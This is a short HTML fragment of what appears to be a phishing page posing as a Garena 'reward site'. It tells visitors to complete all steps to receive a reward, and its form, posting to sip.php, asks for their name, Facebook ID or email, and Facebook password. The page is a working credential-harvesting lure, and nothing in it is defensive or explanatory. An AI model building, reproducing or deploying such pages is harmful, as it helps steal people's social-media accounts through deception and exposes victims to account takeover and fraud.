...
<img src="imgg/garena.png" class="garenalogo"></div><span class="cit topics col-md-12 col-sm-12 col-xs-12">Reward site:</span></div><div class="a_wrap"><div></div>
<span class="txt_c">Fill out all the steps so you can receive your reward</span>


<form action="sip.php" method="get">
<br>

</center>
<label><font color="gold">Your name: </font></label>
...
<br>
<label><font color="gold">Facebook ID: </font></label>
<input  name="Facebook ID:"  placeholder="Enter your facebook number/email" type="text" required>
<br>
<label><font color="gold">Your FB password: </font></label>
<br>
<input  name="Facebook Password:"  placeholder="Enter your fb password" type="password" required>
